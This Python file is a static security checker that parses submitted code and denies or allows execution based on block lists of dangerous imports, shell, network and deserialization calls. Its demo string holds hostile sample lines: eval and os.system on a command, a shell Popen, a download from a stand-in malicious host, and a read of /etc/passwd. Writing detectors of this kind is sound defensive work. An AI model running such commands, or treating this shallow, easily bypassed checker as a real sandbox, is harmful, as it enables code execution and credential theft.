import ast
from typing import List, Set, Dict, Tuple
from dataclasses import dataclass
from enum import Enum

@dataclass
class SecurityIssue:
    """Represents a security issue found in the code."""
    severity: str  # 'high', 'medium', 'low'
    message: str
    node: ast.AST
    line_number: int

class SecurityConfig:
    """Configuration for security checking rules."""
    # Imports that are completely blocked.
    BLOCKED_IMPORTS: Set[str] = frozenset({
        'ctypes', 'cffi', 'subprocess', 'socket',
        'multiprocessing', 'threading', 'asyncio'
    })

    # Functions that are dangerous regardless of context.
    DANGEROUS_FUNCTIONS: Set[str] = frozenset({
        'eval', 'exec', 'compile', '__import__',
        'input',
    })

    # Methods that are dangerous when called on any object.
    DANGEROUS_METHODS: Set[str] = frozenset({
        'system', 'popen', 'fork', 'execve', 'shell',
        'call', 'run', 'Popen', 'execute', 'eval', 'exec'
    })

    # Methods that are dangerous when called on specific objects.
    DANGEROUS_OBJECT_METHODS: Dict[str, Set[str]] = {
        'os': frozenset({
            'system', 'popen', 'spawn', 'fork', 'execve',
            'remove', 'unlink', 'rmdir', 'kill', 'chmod', 'chown'
        }),
        'subprocess': frozenset({
            'run', 'call', 'Popen', 'getoutput', 'check_call', 'check_output'
        }),
        'socket': frozenset({'connect', 'bind', 'listen', 'accept'}),
        'pickle': frozenset({'load', 'loads', 'Unpickler'}),
        'importlib': frozenset({'import_module'}),
        'shutil': frozenset({'rmtree', 'move'}),
        'tarfile': frozenset({'extractall'}),
        'zipfile': frozenset({'extractall'}),
        'pathlib': frozenset({'unlink', 'rmdir', 'chmod', 'chown'}),
        'tempfile': frozenset({'mkdtemp', 'mkstemp', 'TemporaryFile'}),
        'os.path': frozenset({'expanduser', 'expandvars', 'join', 'split', 'splitext'}),
    }

    # High-risk network functions that initiate external connections.
    NETWORK_FUNCTIONS: Dict[str, Set[str]] = {
        'socket': frozenset({'socket', 'connect', 'create_connection'}),
        'requests': frozenset({'get', 'post', 'put', 'delete', 'head', 'options', 'request', 'Session'}),
        'http.client': frozenset({'HTTPConnection', 'HTTPSConnection'}),
        'urllib.request': frozenset({'urlopen'}),
        'ftplib': frozenset({'FTP', 'FTP_TLS'}),
        'aiohttp': frozenset({'ClientSession', 'get', 'post', 'put', 'delete'}),
    }

    # Imports that allow direct access to lower-level C code and could be used
    # to bypass our Python-level analysis.
    LOW_LEVEL_LIBRARIES: Set[str] = frozenset({
        'ctypes', 'cffi', 'cython', '_ctypes', '_cffi', '_cython'
    })


    # Whitelist of common data science and analysis libraries
    WHITELIST_IMPORTS: Set[str] = frozenset({
        'pandas', 'numpy', 'scipy', 'sklearn', 'tensorflow',
        'torch', 'matplotlib', 'seaborn', 'statsmodels',
        'nltk', 'spacy', 'transformers', 'math', 'statistics',
        'random', 'datetime', 'json', 'csv', 'pathlib',
        'collections', 'itertools', 'functools'
    })

# Mapping for sorting issues by severity.
SEVERITY_ORDER = {'high': 0, 'medium': 1, 'low': 2}

class ExecutionPolicy(Enum):
    ALLOW = "allow"
    ALLOW_WITH_FALCO = "allow_with_falco"
    DENY = "deny"

class UnifiedSecurityVisitor(ast.NodeVisitor):
    """
    A unified visitor that performs comprehensive security checks on Python code.
    """
    def __init__(self, config: SecurityConfig = None):
        self.issues: List[SecurityIssue] = []
        self.config = config if config is not None else SecurityConfig()

    def _add_issue(self, severity: str, message: str, node: ast.AST):
        """Helper to add a security issue with line number information."""
        lineno = getattr(node, 'lineno', -1)
        self.issues.append(SecurityIssue(severity, message, node, lineno))

    def visit_Import(self, node: ast.Import):
        """Check import statements for blocked or low-level libraries."""
        for alias in node.names:
            base_module = alias.name.split('.')[0]
            
            # Skip if module is whitelisted
            if base_module in self.config.WHITELIST_IMPORTS:
                continue

            if base_module in self.config.BLOCKED_IMPORTS:
                self._add_issue(
                    'high',
                    f"Importing blocked module '{alias.name}'",
                    node
                )
            if base_module in self.config.LOW_LEVEL_LIBRARIES:
                self._add_issue(
                    'high',
                    f"Importing low-level library '{alias.name}' is prohibited",
                    node
                )
        self.generic_visit(node)

    def visit_ImportFrom(self, node: ast.ImportFrom):
        """Check from-import statements for blocked or low-level libraries."""
        if node.module:
            base_module = node.module.split('.')[0]
            if base_module in self.config.BLOCKED_IMPORTS:
                self._add_issue(
                    'high',
                    f"Importing from blocked module '{node.module}'",
                    node
                )
            if base_module in self.config.LOW_LEVEL_LIBRARIES:
                self._add_issue(
                    'high',
                    f"Importing low-level library '{node.module}' is prohibited",
                    node
                )
        self.generic_visit(node)

    def visit_Call(self, node: ast.Call):
        """Check function calls for dangerous operations and network requests."""
        # Check direct function calls.
        if isinstance(node.func, ast.Name):
            if node.func.id in self.config.DANGEROUS_FUNCTIONS:
                self._add_issue(
                    'high',
                    f"Usage of dangerous function '{node.func.id}'",
                    node
                )
        elif isinstance(node.func, ast.Attribute):
            self._check_attribute_call(node.func)
        self.generic_visit(node)

    def visit_While(self, node: ast.While):
        # Add a check for infinite loops (e.g., `while True:`)
        if isinstance(node.test, ast.Constant) and node.test.value is True:
            self._add_issue('high', "Infinite loop detected (potential resource abuse)", node)
        self.generic_visit(node)

    def _check_attribute_call(self, node: ast.Attribute):
        """Helper to check attribute-based calls for dangerous operations."""
        # Check for dangerous method names.
        if node.attr in self.config.DANGEROUS_METHODS:
            self._add_issue(
                'medium',
                f"Potentially dangerous method call '{node.attr}'",
                node
            )
        # Check for object-specific dangerous methods.
        if isinstance(node.value, ast.Name):
            obj_name = node.value.id
            if obj_name in self.config.DANGEROUS_OBJECT_METHODS:
                if node.attr in self.config.DANGEROUS_OBJECT_METHODS[obj_name]:
                    self._add_issue(
                        'high',
                        f"Dangerous method '{node.attr}' called on '{obj_name}' object",
                        node
                    )
            # Check for network calls.
            if obj_name in self.config.NETWORK_FUNCTIONS:
                if node.attr in self.config.NETWORK_FUNCTIONS[obj_name]:
                    self._add_issue(
                        'high',
                        f"Network request via {obj_name}.{node.attr} detected",
                        node
                    )
        # Additional check: dynamic import using importlib.import_module.
        if isinstance(node.value, ast.Name) and node.value.id == 'importlib' and node.attr == 'import_module':
            self._add_issue(
                'high',
                "Usage of dynamic import 'importlib.import_module' is dangerous",
                node
            )

    def visit_Constant(self, node: ast.Constant):
        """Check string constants for suspicious keywords."""
        if isinstance(node.value, str):
            suspicious_keywords = [
                'botnet', 'malware', 'crypto', 'bitcoin',
                'ethereum', 'hack', 'exploit'
            ]
            lower_value = node.value.lower()
            for keyword in suspicious_keywords:
                if keyword in lower_value:
                    self._add_issue(
                        'low',
                        f"Suspicious keyword '{keyword}' found in string literal",
                        node
                    )
        self.generic_visit(node)

    def visit_Attribute(self, node: ast.Attribute):
        """Check attribute access for potentially dangerous operations."""
        self.generic_visit(node)

def analyze_code_security(code: str) -> List[SecurityIssue]:
    """
    Analyze Python code for security issues.

    Args:
        code: String containing Python code to analyze

    Returns:
        List of SecurityIssue objects describing any issues found

    Raises:
        SyntaxError: If the code cannot be parsed
    """
    try:
        tree = ast.parse(code)
    except SyntaxError as e:
        raise SyntaxError(f"Failed to parse code: {e}")

    visitor = UnifiedSecurityVisitor()
    visitor.visit(tree)

    # Sort issues by severity and line number.
    return sorted(
        visitor.issues,
        key=lambda issue: (SEVERITY_ORDER.get(issue.severity, 3), issue.line_number)
    )

def format_security_report(issues: List[SecurityIssue]) -> str:
    """Format security issues into a readable report."""
    if not issues:
        return "No security issues found."
    report_lines = ["Security Analysis Report:"]
    for issue in issues:
        report_lines.append(f"[{issue.severity.upper()}] Line {issue.line_number}: {issue.message}")
    return "\n".join(report_lines)

def classify_code_execution(code: str) -> Tuple[ExecutionPolicy, List[SecurityIssue]]:
    """
    Classify the submitted code based on the security analysis.

    Execution policies:
      - DENY: If any high severity issues are detected.
      - ALLOW_WITH_FALCO: If no high severity issues but medium severity issues exist.
      - ALLOW: If only low or no issues are detected.

    Returns:
        A tuple containing the ExecutionPolicy and the list of security issues.
    """
    issues = analyze_code_security(code)
    if any(issue.severity == 'high' for issue in issues):
        return ExecutionPolicy.DENY, issues
    if any(issue.severity == 'medium' for issue in issues):
        return ExecutionPolicy.ALLOW_WITH_FALCO, issues
    return ExecutionPolicy.ALLOW, issues

if __name__ == '__main__':
    # Sample code for demonstration purposes.
    sample_code = """
import os
import importlib
import requests
import cython

def dangerous_operation(cmd):
    eval(cmd)
    os.system(cmd)
    mod = importlib.import_module('subprocess')
    mod.Popen(cmd, shell=True)
    response = requests.get('http://malicious.example.com/malware')
    open('/etc/passwd', 'r')
    malicious = "This is a bitcoin mining script"
    """
    policy, issues_found = classify_code_execution(sample_code)
    report = format_security_report(issues_found)
    print(report)
    print("\nExecution Policy:", policy.value)
